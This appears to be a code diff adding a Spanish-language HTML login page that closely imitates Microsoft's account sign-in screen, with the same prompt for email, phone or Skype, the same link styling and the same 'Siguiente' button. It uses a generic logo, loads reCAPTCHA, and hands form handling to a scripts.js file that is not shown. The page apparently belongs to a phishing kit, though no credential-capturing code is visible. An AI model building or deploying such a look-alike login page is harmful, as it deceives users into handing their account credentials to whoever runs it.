@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar Sesión</title>
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+    <link rel="stylesheet" type="text/css" href="styles.css">
+    <script type="text/javascript" src="scripts.js"></script>
+
+</head>
+<body>
+
+    <!-- Contenido principal oculto inicialmente -->
+    <div id="main-content">
+        <form id="loginForm">
+            <div class="container">
+                <div class="login-box">
+                    <div class="login-content">
+                        <img src="logo.svg" alt="Logo" class="logo">
+                        <br>
+                        <h2 style="color: black; float: left; font-weight: 600; line-height: 28px; font-size: 1.5rem; display: block; margin-bottom: 5px;">Iniciar sesión</h2>
+                        <input type="email" id="email" required placeholder="Correo electrónico, teléfono o Skype">
+                        <br><br>
+                        <div align="left" style="font-size: 0.8125rem; color: black;">¿No tiene una cuenta? <a style="color: #0067b8; cursor: pointer;" onmouseover="this.style.textDecoration='underline'" onmouseout="this.style.textDecoration='none'">Cree una.</a></div>
+                        <br><br>
+                        <button type="submit">Siguiente</button>
+                    </div>
+                </div>
+            </div>
+        </form>
+    </div>
+
+
+</body>
+</html>
